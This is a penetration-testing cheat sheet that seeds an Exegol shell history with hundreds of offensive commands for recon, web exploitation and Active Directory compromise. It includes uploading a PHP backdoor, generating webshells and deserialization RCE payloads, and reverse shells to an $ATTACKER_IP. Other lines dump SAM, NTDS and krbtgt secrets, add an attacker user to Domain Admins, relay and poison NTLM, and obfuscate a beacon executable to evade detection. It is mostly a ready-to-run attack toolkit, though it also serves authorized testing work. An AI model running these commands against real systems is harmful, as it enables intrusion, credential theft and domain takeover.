# Bash tricks - tricks using shells in general

## symlink abuse
```
If a script do not use absolute path to run binaries, to access file, then leverage symlinks : 'ln -s ..'
```

## bash - code execution in arithmetic expression
```
See
https://unix.stackexchange.com/questions/172103/security-implications-of-using-unsanitized-data-in-shell-arithmetic-evaluation
https://github.com/koalaman/shellcheck/issues/3088
https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
```

## bash - zsh - exegol set-up
```
# Quick an dirty exegol history set-up

# === Create ~/.exegol_history file storing the prebuilt commands
echo '
sshpass -p "$PASSWORD" ssh -oStrictHostKeyChecking=no "$USER"@"$TARGET"
dig axfr "$DOMAIN" @"$TARGET"
nslookup -type=srv _gc._tcp."$DOMAIN"
nslookup -type=srv _kerberos._tcp."$DOMAIN"
nslookup -type=srv _kpasswd._tcp."$DOMAIN"
nslookup -type=srv _ldap._tcp."$DOMAIN"
nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN"
nslookup -type=srv _ldap._tcp.dc._msdcs."$DOMAIN"
net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
net rpc group members 'Domain admins' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
nmblookup -A "$TARGET"
ssh-keygen -t rsa -b 4096 -f keyname
snmpwalk -c public -v 1 "$TARGET"
snmpwalk -c public -v 2c "$TARGET"
faketime "2022-01-31 22:05:35" zsh
faketime "$(date +'%Y-%m-%d') $(net time -S $DC_IP | awk '{print $4}')" zsh
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
curl "$TARGET" --upload-file backdoor.php -v
curl --ntlm -u "$USER":"$PASSWORD" 127.0.0.1
gf php-sources
gf -save php-serialized -HnrE '(a:[0-9]+:{|O:[0-9]+:"|s:[0-9]+:")'
firefox &> /dev/null &
exegol-history export creds -u 'Administrator' --json
exh export creds -u 'Administrator' --json
exegol-history export hosts --ip '127.0.0.1'
exh export hosts --ip '127.0.0.1'
exegol-history export creds
exh export creds
exegol-history add creds -u 'Administrator' -p 'Passw0rd!'
exh add creds -u 'Administrator' -p 'Passw0rd!'
exegol-history add hosts --ip '127.0.0.1'
exh add hosts --ip '127.0.0.1'
exegol-history show
exh show
exegol-history set creds
exh set creds
exegol-history set hosts
exh set hosts
exegol-history unset
exh unset
rlwrap nc -lvnp 1337
convert input.jpg -resize 80x80^ -gravity center -extent 80x80 icon.png
rsync -avz ./src ./dest
rsync -avz ./src ./dest
goshs -b "goshs":"exegol4thewin" --ssl --self-signed -p 8001 -d /workspace
goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8002 -d /opt/resources
searchsploit -x php/webapps/5220.php
searchsploit -m php/webapps/5220.php
shellerator
shellerator --reverse-shell --lhost "$ATTACKER_IP" --lport 1337 --type powershell
uberfile --lhost $TARGET --lport $PORT --target-os linux --command python --input-file LinEnum.sh --output-file /tmp/linenum.sh
arsenal
triliumnext-start
ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
ngrok config add-authtoken https://dashboard.ngrok.com/get-started/your-authtoken
whatportis 3306
whatportis postgresql
objectwalker -m jinja2 --filter-module os --max-depth 15
creds search tomcat
uploader --port 8081 -f /opt/resources/linux/linPEAS/linpeas.sh --os linux -p 8080 --payload Wget
uploader --port 8081 -f /opt/resources/windows/mimikatz/x64/mimikatz.exe --os windows -p 8080 --payload Iwr -o imfile.exe
wes --update
wes systeminfo.txt
wes --impact "Remote Code Execution" systeminfo.txt
pwsh
ps-empire server --restport 8765
ps-empire client
pwncat-cs -lp $PORT
pwncat-cs $TARGET:$PORT
pwncat-cs ssh://$USER:$PASSWORD@$TARGET
service postgresql start
sliver-server
sliver-client
havoc server --verbose --debug --profile /opt/tools/Havoc/profiles/havoc.yaotl
havoc client
Villain.py
Villain.py --port 2000 --hoax-port 2001 --netcat-port 2002 --file-smuggler-port 2003
cupp -i
crunch 4 7 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txt
cewl --depth 10 --with-numbers --write cewl.txt "$TARGET"
cewler --output cewler.txt "$TARGET"
cewler --output cewler.txt --depth 5 --lowercase --min-word-length 2 --without-numbers "$TARGET"
pass-station search tomcat
username-anarchy tony stark
genusernames 'tony stark'
hashcat --hash-type 1000 --potfile-path "$DOMAIN".ntds.cracked "$DOMAIN".ntds --show --username
hashcat --hash-type 16800 --attack-mode 0 dump_WPA-PMKID-PBKDF2.hashcat `fzf-wordlists`
hashcat --hash-type 22000 --attack-mode 0 dump_WPA-PBKDF2-PMKID_EAPOL.hashcat `fzf-wordlists`
hashcat --hash-type 0 --attack-mode 0 --username MD5_hashes.txt `fzf-wordlists`
hashcat --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
hashcat --hash-type 1000 --attack-mode 0 --username "$DOMAIN".ntds `fzf-wordlists`
hashcat --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
hashcat --hash-type 18200 --attack-mode 0 ASREProastables.txt `fzf-wordlists`
hcat '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305'
hcat Kerberoastables.txt
fcrackzip -u -v -D -p `fzf-wordlists` file.zip
pdfcrack -f confidential.pdf
bruteforce-luks -t 4 -l 5 -m 5 /dev/sdb1
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 HashToPwn.txt --rules=all
john --format=krb5tgs --wordlist=`fzf-wordlists` Kerberoastables.txt
john --wordlist=`fzf-wordlists` ASREProastables.txt
hjohn ASREProastables.txt
hjohn '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305'
nth --text 5f4dcc3b5aa765d61d8327deb882cf99
haiti $HASH
haiti --extended $HASH
haiti --no-color --short $HASH
haiti samples $REF
geowordlists --postal-code 75001 --kilometers 25 --output-file /tmp/around_paris.txt
zip "kown_plaintext" "unencrypted.zip"
pkcrack -C "encrypted.zip" -c "path/to/cipher" -P "unencrypted.zip" -p "kown_plaintext"
pkcrack -C "encrypted.zip" -c "path/to/cipher" -P "unencrypted.zip" -p "kown_plaintext" -d "decrypted.zip" -a
zipdecrypt "key0" "key1" "key2" "encrypted.zip" "decrypted.zip"
exiftool image.png
exifprobe image.png
dnsenum $TARGET
tor
whois $TARGET
recon-ng
youtube-dl $TARGET
sublist3r -v -d "$DOMAIN"
assetfinder google.com
subfinder -d "$DOMAIN" 
subfinder -silent -d "$DOMAIN" | dnsx -silent
subfinder -silent -d "$DOMAIN" | dnsx -silent -a -resp
subfinder -silent -d "$DOMAIN" | dnsx -silent -a -resp-only
subfinder -silent -d "$DOMAIN" | dnsx -silent -cname -resp
subfinder -silent -d "$DOMAIN" | dnsx -silent -rcode noerror,servfail,refused
findomain -t $TARGET
holehe test@gmail.com
SimplyEmail.py -all -e cybersyndicates.com
theHarvester -d github.com -b all
theHarvester -d "$DOMAIN" -g -s -r -f "$DOMAIN.xml" -b all
h8mail -t test@gmail.com
pwnedornot.py -d $DOMAIN
phoneinfoga scan -n 33123456789
maigret "username"
linkedin2username.py -u myname@email.com -c uber-com
toutatis -s SESSIONID -u starbucks
waybackurls test.com
carbon14.py http://menfous.com/
photon.py -u $TARGET -l 3 -t 100 --wayback
ipinfo 1.1.1.1
constellation
maltego
spiderfoot -l 127.0.0.1:5001
spiderfoot-cli -s http://127.0.0.1:5002
finalrecon.py --headers $TARGET
finalrecon.py --sslinfo $TARGET
finalrecon.py --whois $TARGET
finalrecon.py --crawl $TARGET
finalrecon.py --full $TARGET
searchfy -q $USER
mailfy -n $USER
usufy -n $USER -p all
pwndb.py --target @example.com --output txt
github-email ghusername
recondog -t $TARGET
gron test.json
gron $TARGET
curl $TARGET/test.json | gron
ignorant 33 111111111 --only-used
trevorspray -u emails.txt -p $PASSWORD --exit-on-success
trevorspray --recon $DOMAIN -u emails.txt --threads 10
trevorspray -u emails.txt -p $PASSWORD --ssh root@$TARGET
geopincer.py "Texas" "Office Depot" "Sam's Club"
geopincer.py "Texas" "Office Depot" "Sam's Club" --distance 300
yalis -u admin@example.com -p Password123 --id 1234 -f csv -o yalis-1234.csv
yalis -u admin@example.com -p Password123 --name "Company Name Inc." -f csv -o yalis-company-name.csv
MurMurHash.py https://www.paypalobjects.com/webstatic/icon/pp32.png
sherlock user123
sherlock user1 user2 user3
censys config
gomapenum linkedin gather -c contoso -f "{f}{last}@contoso.com" -e -s 'test'
gomapenum searchEngine gather -c contoso -f "{f}{last}@contoso.com" -e
pymeta -d "target.domain"
dirb "http://$TARGET" /usr/share/seclists/Discovery/Web-Content/big.txt
prips 192.168.56.0/24|hakrevdns -d|httpx -probe -tech-detect -status-code -fr
prips 192.168.0.0 192.168.0.255
prips -i4 192.168.0.10 192.168.0.250
prips 173.0.84.0/24 | hakrevdns
swaks --to admin@example.com --from user@example.com --header "Subject: Exploit" --body "Hey, this is a mail" --server $IP
weevely generate $PASSWORD ./webshell-exegol.php
weevely https://$TARGET/webshell-exegol.php $PASSWORD id
whatweb $TARGET
wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic "FUZZ:FUZ2Z" -u "http://$TARGET/secretpage"
wfuzz --hc 403,404 -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -u "http://$TARGET/FUZZFUZ2Z"
wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
wfuzz --hh 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' -u "http://$TARGET/admin"
gobuster dir -w `fzf-wordlists` -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi,bak,tar.gz,tgz,zip -u "http://$TARGET/"
gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
gobuster dns -d "$TARGET" -w `fzf-wordlists`
gobuster vhost -u "$TARGET" -w `fzf-wordlists` --append-domain
kr brute https://target.com/subapp/ -A=aspx-210328:20000 -x 20 -j 1
kr brute https://target.com/subapp/ -w dirsearch.txt -x 20 -j 1 -exml,asp,aspx,ashx -D
kr scan hosts.txt -A=apiroutes-210328:20000 -x 5 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
kr scan https://target.com:8443/ -w  /opt/tools/kiterunner/routes-large.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
kr scan target.com -w /opt/tools/kiterunner/routes-large.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
kr scan target.com -w routes.kite -A=apiroutes-210328:20000 -x 20 -j 1 --fail-status-codes 400,401,404,403,501,502,426,411
kr scan targets.txt -w /opt/tools/kiterunner/routes-small.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
amass enum -d $TARGET
ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u "http://$TARGET/FUZZ"
ffuf -c -w `fzf-wordlists` -u "http://$TARGET/FUZZ"
dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://$TARGET/"
ssrfmap.py -r request.txt -p id -m readfiles,portscan
gopherus.py --exploit mysql
xsstrike.py -u $TARGET
xsser -u $TARGET -g '/login?password=XSS' --Coo
xsrfprobe -u $TARGET
bolt.py -u $TARGET
kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u "http://$TARGET/?page=file1.php"
kadimus -u "http://$TARGET/?page=file1.php"
fuxploider.py --url $TARGET --not-regex "wrong file type"
patator.py ftp_login host=$TARGET user=FILE0 0=logins.txt password=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
joomscan -u $TARGET
joomscan -u $TARGET --enumerate-components
joomscan -u $TARGET --proxy http://127.0.0.1:8080
wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-detection aggressive
wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
droopescan scan drupal -u $TARGET -t 32
drupwn --mode exploit --target $TARGET
cmsmap -F -d "http://$TARGET/"
moodlescan.py -r -u "http://$TARGET/"
testssl.sh $TARGET
cloudfail.py --target seo.com --tor
EyeWitness.py -f urls.txt --web
oneforall.py --target $TARGET run
wafw00f $TARGET
cors_scan.py -i urls.txt -t 100
echo "http://$TARGET/" | hakrawler -d 10
gowitness scan nmap -f nmap.xml --open-only --service-contains http --delay 5 --timeout 5
linkfinder.py -i $TARGET -o cli
timing_attack -u $TARGET --parameters '{"password":"INPUT"}' --brute-force
updog --ssl --port 9090 --password "exegol4thewin" --directory /opt/resources
jwt_tool.py $JWT
wuzz $TARGET
git-dumper $TARGET/.git ./git-dump/
extractor.sh ./git-repo/ ./clean-git-repo/
gitdumper.sh $TARGET/.git ./git-dump/
gitfinder.py -i urls.txt
ysoserial CommonsCollections1 calc.exe > groovypayload.bin
phpggc -l
phpggc -l laravel
phpggc symfony/rce1 id
phpggc monolog/rce1 assert 'phpinfo()'
secret_fragment_exploit.py $TARGET/_fragment -s $SECRET --method 1 --function shell_exec --parameters cmd:id
jdwp-shellifier.py -t $TARGET -p $PORT --cmd "id"
httpmethods.py --threads 40 --location "http://$TARGET/"
h2csmuggler.py --scan-list urls.txt --threads 5
h2csmuggler.py -x $TARGET --test
byp4xx $TARGET
feroxbuster -w `fzf-wordlists` -u "http://$TARGET/"
tomcatWarDeployer.py -v -x -p $ATTACKER-PORT -H $ATTACKER-IP $TARGET:8080
clusterd.py -i "http://$TARGET/"
arjun -u $TARGET
arjun -u $TARGET -m POST
nuclei -u http://$TARGET
gau $TARGET
echo '8.8.8.8' | hakrevdns
cat domains.txt | httprobe
httpx -probe -list hosts.txt -tech-detect -status-code -fr
cat newthings.txt | anew things.txt
robotstester -u http://www.example.com/ -L
naabu -host $TARGET
burpsuite &> /dev/null &
smuggler.py -u "http://$TARGET/"
php_filter_chain_generator.py --chain '<?php system($_REQUEST['cmd']); ?>'
kraken.py --connect --mode <MODE> --profile <PROFILE_FILEPATH> --compiler <COMPILER>
sqlmap --forms --batch -u "http://somewebsite/"
sslscan $TARGET
jsluice urls https://$TARGET
jsluice secrets https://$TARGET
jsluice tree https://$TARGET
katana -u https://$TARGET
katana -u https://$TARGET,https://$TARGET
katana -list url_list.txt
katana -u https://$TARGET -headless -no-incognito
postman &> /dev/null &
zap -cmd -addonupdate
zap -host "0.0.0.0" -port "8080" &>/dev/null &
zap -host "127.0.0.1" -port "8080" &>/dev/null &
bbot --target $TARGET --preset subdomain-enum
bbot --target $TARGET --preset subdomain-enum --require-flags passive
bbot --target $TARGET --preset spider
bbot --target $TARGET --preset web-basic
samdump2 SYSTEM SAM > hashes.txt
smbclient --list "$TARGET"
smbclient --no-pass --user '' "//$TARGET/SYSVOL"
smbclient --no-pass --user '' --list "$TARGET"
rpcclient -U "$DOMAIN"/"$USER" "$TARGET"
rpcclient -U '' -N "$DC_HOST"
onesixtyone "$TARGET" manager
onesixtyone "$TARGET" private
onesixtyone "$TARGET" public
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt "$TARGET"
nbtscan -r 192.168.56.0/24
ldapsearch -h "$DC_IP" -x -s "base" "namingcontexts"
ldapsearch -h "$TARGET" -x -b "DC=DOMAIN,DC=LOCAL"
ldapsearch -H ldap://$TARGET -x -b "DC=DOMAIN,DC=LOCAL"
klist
klist purge
kdestroy
export KRB5CCNAME="$(pwd)/TGT.ccache"
ASRepCatcher relay -dc "$DC_IP"
ASRepCatcher relay -dc "$DC_IP" -iface "$INTERFACE" -tf targets.txt -format hashcat -outfile ASREPHashes.txt -usersfile users.txt
ASRepCatcher listen -dc "$DC_IP" -iface "$INTERFACE"
pretender -i "$INTERFACE" --dry
pretender -i "$INTERFACE" --dry --no-ra
pretender -i "$INTERFACE" --dry --no-ra-dns
pretender -i "$INTERFACE" --spoof "$DOMAIN"
Responder.py --interface "$INTERFACE" --analyze --lm --disable-ess
Responder.py --interface "$INTERFACE" --analyze --disable-ess
Responder.py --interface "$INTERFACE" --wpad --lm --ProxyAuth --disable-ess
Responder.py --interface "$INTERFACE" --wpad --lm --disable-ess
responder --interface "$INTERFACE" --analyze --lm --disable-ess
responder --interface "$INTERFACE" --analyze --disable-ess
responder --interface "$INTERFACE" --wpad --lm --ProxyAuth --disable-ess
responder --interface "$INTERFACE" --wpad --lm --disable-ess
responder-http-off
responder-http-on
responder-smb-off
responder-smb-on
ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_HOST"
sprayhound -d "$DOMAIN" -dc "$DC_HOST" -nu 'neo4j' -np 'exegol4thewin' -lu "$USER" -lp "$PASSWORD"
sprayhound -d "$DOMAIN" -dc "$DC_HOST" -nu 'neo4j' -np 'exegol4thewin' -lu "$USER" -lp "$PASSWORD" -p 'somepassword'
smartbrute -v -np 'exegol4thewin' --set-as-owned smart -bp "somepassword" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$DC_IP" kerberos
bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" --hashes 'ffffffffffffffffffffffffffffffff':"$NT_HASH" -dc "$DC_HOST"
bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
bloodhound-ce.py --zip -c All -d "$DOMAIN" -u "$USER" --hashes 'ffffffffffffffffffffffffffffffff':"$NT_HASH" -dc "$DC_HOST"
bloodhound-ce.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST"
bloodhound &> /dev/null &
cypheroth.sh -u neo4j -p exegol4thewin -d "$DOMAIN"
mitm6 --interface "$INTERFACE"
mitm6 --interface "$INTERFACE" --domain "$DOMAIN"
aclpwn -f $COMPUTER -ft computer -t $DOMAIN -tt domain -d $DOMAIN -dry
findDelegation.py -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SAM' -o '\\192.168.56.1\SHUTDOWN'
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\SHUTDOWN'
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET" backup -o '\\192.168.56.1\SHUTDOWN'
smbserver.py -smb2support EXEGOL .
secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
secretsdump -ntds ntds.dit.save -system system.save LOCAL
secretsdump -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
secretsdump -k "$TARGET"
secretsdump -k -outputfile "$DOMAIN" "$DC_HOST"
secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
secretsdump -just-dc-user krbtgt -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
KRB5CCNAME='COMPUTER.ccache' getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
getST.py -self -impersonate 'domainadmin' -altservice "cifs/$TARGET" -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$TARGET\$"
getST.py -spn "host/$TARGET" -impersonate 'domainadmin' -dc-ip "$DC_IP" "$DOMAIN"/'EXEGOL-01$':'exegol4thewin'
getST.py -spn CIFS/"$TARGET" -impersonate Administrator -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
ntlmrelayx -t "https://pki.$DOMAIN/certsrv/certfnsh.asp" -smb2support --adcs --template "KerberosAuthentication"
ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
ntlmrelayx -t dcsync://"$DC_HOST" -smb2support
ntlmrelayx -t "ldaps://$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --escalate-user 'EXEGOL-01$'
ntlmrelayx -t ldaps://"$DC_HOST" --http-port 80 --no-dump --no-smb-server --delegate-access --add-computer 'EXEGOL-01' 'exegol4thewin'
ntlmrelayx -t ldaps://"$DC_HOST" -smb2support --remove-mic --delegate-access --add-computer 'EXEGOL-01' 'exegol4thewin'
ntlmrelayx -t ldap://"$DC_HOST" -smb2support --interactive
ntlmrelayx -tf targets.txt -w --ipv6 -smb2support --lootdir ntlmrelayx_lootdir --http-port 3128,80
Get-GPPPassword -debug -no-pass "$DC_HOST"
Get-GPPPassword "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
ms14-068.py -u "$USER"@"$DOMAIN" --rc4 "$NT_HASH" -s "$DOMAIN_SID" -d "$DC_HOST"
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/"$USER"
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip "$DC_IP" "$DOMAIN"/Administrator
GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
addcomputer.py -delete -computer-name 'SHUTDOWN$' -dc-host DC01 -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
dacledit.py -action write -rights DCSync -principal 'owneduser' -target-dn 'DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
wmiexec.py -codec cp850 -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
wmiexec.py -k "$TARGET"
ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
smbexec.py -share 'ADMIN$' -k "$TARGET"
rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
owneredit.py -action write -new-owner "$NEW_OWNER" -target "$TARGET_OBJECT" "$DOMAIN"/"$USER":"$PASSWORD"
mssqlclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
describeTicket.py "$KRB5CCNAME"
ms14-068.py -u $USER -s $SID -d $DOMAIN
KRB5CCNAME="ticket.ccache" lsassy -k -d "$DOMAIN" -u "$USER" -K lsass_loot -o lsass_creds.txt "$TARGET"
proxychains lsassy -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -K lsass_loot -o lsass_creds.txt "$TARGET"
lsassy -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
lsassy -v -u "$USER" -H "$NT_HASH" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
privexchange.py -ah "$ATTACKER_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$TARGET"
privexchange.py -u "$USER" -p "$PASSWORD" -ah "EXEGOL-01.$DOMAIN" EXCHANGE."$DOMAIN" -d "$DOMAIN"
ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose abk dump -o emails.txt
ruler -k -d "$DOMAIN" brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
darkarmour.py -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
amber -f beacon.exe
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
addspn.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -t SV01 -s "HTTP/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
krbrelayx.py -aesKey "9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab"
krbrelayx.py --krbhexpass "$UD_HEXPASSWORD" --krbsalt "DOMAIN.LOCALhostcomputer.domain.local"
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST" --forest
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST" --forest
